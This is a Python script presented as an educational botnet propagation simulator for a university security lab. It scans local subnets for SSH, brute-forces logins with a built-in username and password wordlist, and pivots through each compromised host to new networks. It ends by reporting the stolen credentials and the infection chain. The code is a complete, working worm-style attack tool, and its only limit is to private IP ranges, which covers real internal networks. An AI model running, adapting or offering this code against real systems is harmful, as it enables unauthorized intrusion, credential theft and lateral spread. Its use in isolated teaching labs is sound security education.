#!/usr/bin/env python3
"""
=============================================================================
Autonomous Botnet Propagation Simulator
FEUP SSR — Educational Use Only
=============================================================================

This script simulates autonomous botnet propagation across unknown network
topologies. It does NOT know the scenario in advance — it discovers the
network the same way a real botnet would:

  1. Scan the current machine's network interfaces
  2. For each network found, scan for SSH targets
  3. Brute-force each target
  4. From each compromised machine, discover its networks
  5. Scan those new networks and repeat

Works correctly on all 4 scenarios:
  Scenario 1 — single flat network
  Scenario 2 — two segments (current lab setup)
  Scenario 3 — three segments, two pivots
  Scenario 4 — three segments, two-hop deep chain

Usage:
  python3 /lab/botnet.py               # run with default settings
  python3 /lab/botnet.py --delay 0.5   # faster scanning
  python3 /lab/botnet.py --report      # show infection report only

SAFETY: only targets IPs in RFC-1918 private ranges
=============================================================================
"""

import argparse
import socket
import time
import random
import json
import subprocess
import sys
import re
from datetime import datetime
from collections import defaultdict

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    print("[!] paramiko not found — using TCP-only mode (limited)")

# ── Credentials wordlist ──────────────────────────────────────────────────────
USERNAMES = ["labuser", "admin", "root", "deploy", "operator", "ubuntu", "pi", "user", "test"]
PASSWORDS = [
    "admin", "password", "password123", "123456", "letmein",
    "qwerty", "welcome", "monkey", "dragon", "master",
    "test", "lab", "default", "changeme", "pass1234",
    "internal123", "service1", "rootpass", "deepnet123", "operator1",
    "deploy123", "toor", "rootdeep",
]

# ── Safety: only attack private RFC-1918 ranges ───────────────────────────────
ALLOWED_PREFIXES = ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.",
                    "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.",
                    "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168."]

def is_safe_target(ip: str) -> bool:
    return any(ip.startswith(p) for p in ALLOWED_PREFIXES)

# ── Infection state ───────────────────────────────────────────────────────────
compromised = {}     # ip -> {user, password, via}
scanned_nets = set() # network prefixes already scanned

def log(msg: str, level: str = "info"):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {"info": "·", "ok": "✓", "warn": "!", "attack": "→", "pwned": "★", "pivot": "⤷"}
    print(f"[{ts}] {icons.get(level,'·')} {msg}", flush=True)

# ── Network discovery ─────────────────────────────────────────────────────────
def get_local_networks() -> list[str]:
    """Return all /24 network prefixes visible from this machine."""
    networks = []
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            # Look for lines like "10.10.0.0/24 dev eth1"
            m = re.search(r'(\d+\.\d+\.\d+)\.\d+/\d+', line)
            if m:
                prefix = m.group(1) + "."
                if is_safe_target(prefix + "1") and prefix not in networks:
                    networks.append(prefix)
    except Exception as e:
        log(f"Route discovery error: {e}", "warn")
    return networks

def get_networks_from_host(ip: str, user: str, password: str) -> list[str]:
    """SSH to a compromised host and discover its network interfaces."""
    if not HAS_PARAMIKO:
        return []
    networks = []
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=user, password=password, timeout=8,
                       look_for_keys=False, allow_agent=False)
        _, stdout, _ = client.exec_command("ip route 2>/dev/null || route -n 2>/dev/null")
        output = stdout.read().decode()
        for line in output.splitlines():
            m = re.search(r'(\d+\.\d+\.\d+)\.\d+', line)
            if m:
                prefix = m.group(1) + "."
                if is_safe_target(prefix + "1") and prefix not in networks:
                    networks.append(prefix)
        client.close()
    except Exception as e:
        log(f"Network discovery from {ip} failed: {e}", "warn")
    return networks

# ── Port scanning ─────────────────────────────────────────────────────────────
def probe_ssh(ip: str, timeout: float = 1.0) -> bool:
    """Check if port 22 is open on an IP."""
    try:
        sock = socket.create_connection((ip, 22), timeout=timeout)
        sock.close()
        return True
    except Exception:
        return False

def scan_network(prefix: str) -> list[str]:
    """Scan a /24 network for SSH targets. Returns list of live IPs."""
    if prefix in scanned_nets:
        return []
    scanned_nets.add(prefix)
    log(f"Scanning {prefix}0/24 for SSH targets...", "info")
    live = []
    for i in range(1, 50):
        ip = f"{prefix}{i}"
        if not is_safe_target(ip):
            continue
        if probe_ssh(ip, timeout=0.8):
            live.append(ip)
            log(f"  OPEN ssh://{ip}:22", "ok")
    log(f"  Found {len(live)} SSH target(s) on {prefix}0/24", "info")
    return live

# ── SSH brute-force ───────────────────────────────────────────────────────────
def brute_force(target: str, delay: float = 0.5, via: str = "direct") -> dict | None:
    """
    Try all username/password combinations against an SSH target.
    Returns credential dict on success, None on failure.
    """
    if not HAS_PARAMIKO:
        log(f"  Cannot brute-force {target} — paramiko not available", "warn")
        return None

    if not is_safe_target(target):
        log(f"  SAFETY: {target} is not a private IP — skipping", "warn")
        return None

    if target in compromised:
        log(f"  {target} already compromised — skipping", "info")
        return compromised[target]

    log(f"Brute-forcing {target} (via {via})...", "attack")

    creds = [(u, p) for u in USERNAMES for p in PASSWORDS]
    random.shuffle(creds)
    attempt = 0

    for username, password in creds:
        attempt += 1
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                target, port=22, username=username, password=password,
                timeout=5, banner_timeout=8, auth_timeout=5,
                look_for_keys=False, allow_agent=False
            )
            log(f"  [{attempt:03d}] CREDENTIAL FOUND: {username}:{password} @ {target}", "pwned")
            client.close()
            cred = {"user": username, "password": password, "via": via, "attempts": attempt}
            compromised[target] = cred
            return cred
        except paramiko.AuthenticationException:
            log(f"  [{attempt:03d}] FAILED {username}:{password}", "info") if attempt % 10 == 0 else None
        except Exception as e:
            pass
        time.sleep(delay + random.uniform(0, 0.1))

    log(f"  Brute-force failed on {target} after {attempt} attempts", "warn")
    return None

# ── Propagation engine ────────────────────────────────────────────────────────
def propagate(queue: list, delay: float):
    """
    Process a queue of (ip, via_host) pairs.
    For each: brute-force, then discover new networks from compromised host.
    """
    while queue:
        target_ip, via = queue.pop(0)

        if target_ip in compromised:
            continue

        cred = brute_force(target_ip, delay=delay, via=via)
        if not cred:
            continue

        # From compromised host, discover new reachable networks
        log(f"Discovering networks from compromised {target_ip}...", "pivot")
        new_nets = get_networks_from_host(target_ip, cred["user"], cred["password"])

        for net in new_nets:
            if net not in scanned_nets:
                log(f"  New network discovered: {net}0/24 (via {target_ip})", "pivot")
                new_targets = scan_network(net)
                for t in new_targets:
                    if t not in compromised and t != target_ip:
                        queue.append((t, target_ip))

# ── Report ────────────────────────────────────────────────────────────────────
def print_report():
    print("\n" + "═" * 60)
    print("  BOTNET PROPAGATION REPORT")
    print("═" * 60)
    print(f"  Total compromised hosts : {len(compromised)}")
    print(f"  Networks scanned        : {len(scanned_nets)}")
    print()
    if not compromised:
        print("  No hosts compromised.")
        return

    # Group by network
    by_net = defaultdict(list)
    for ip, cred in compromised.items():
        net = ".".join(ip.split(".")[:3])
        by_net[net].append((ip, cred))

    for net, hosts in sorted(by_net.items()):
        print(f"  Network {net}.0/24:")
        for ip, cred in hosts:
            print(f"    [{cred['via']}] {ip}  user={cred['user']} pass={cred['password']}  ({cred['attempts']} attempts)")
    print()

    # Infection tree
    print("  Infection chain:")
    roots = [(ip, c) for ip, c in compromised.items() if c["via"] == "direct"]
    for ip, cred in roots:
        print(f"    attacker → {ip} ({cred['user']}:{cred['password']})")
        children = [(i, c) for i, c in compromised.items() if c["via"] == ip]
        for cip, ccred in children:
            print(f"      → {cip} ({ccred['user']}:{ccred['password']})")
            grandchildren = [(i, c) for i, c in compromised.items() if c["via"] == cip]
            for gcip, gccred in grandchildren:
                print(f"        → {gcip} ({gccred['user']}:{gccred['password']})")
    print("═" * 60)

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Autonomous Botnet Propagation Simulator — FEUP SSR",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--delay",  type=float, default=0.8, help="Delay between attempts (default 0.8s)")
    parser.add_argument("--report", action="store_true",     help="Show report only")
    args = parser.parse_args()

    print("""
╔══════════════════════════════════════════════════════════════╗
║  AUTONOMOUS BOTNET PROPAGATION SIMULATOR                    ║
║  EDUCATIONAL USE ONLY — isolated Docker networks            ║
╚══════════════════════════════════════════════════════════════╝
""")

    if args.report:
        print_report()
        return

    # ── Phase 1: Discover local networks ─────────────────────────────────────
    log("Phase 1 — Discovering local network interfaces", "info")
    local_nets = get_local_networks()
    if not local_nets:
        log("No networks found via ip route — using default 172.21.0.", "warn")
        local_nets = ["172.21.0."]
    log(f"Local networks: {local_nets}", "ok")

    # ── Phase 2: Initial scan and attack ─────────────────────────────────────
    log("Phase 2 — Initial scan and brute-force", "info")
    queue = []
    for net in local_nets:
        targets = scan_network(net)
        for t in targets:
            queue.append((t, "direct"))

    if not queue:
        log("No SSH targets found on local networks", "warn")
        return

    log(f"Found {len(queue)} initial target(s)", "ok")

    # ── Phase 3: Propagate ────────────────────────────────────────────────────
    log("Phase 3 — Propagating through discovered networks", "info")
    propagate(queue, args.delay)

    # ── Done ──────────────────────────────────────────────────────────────────
    print_report()

if __name__ == "__main__":
    main()
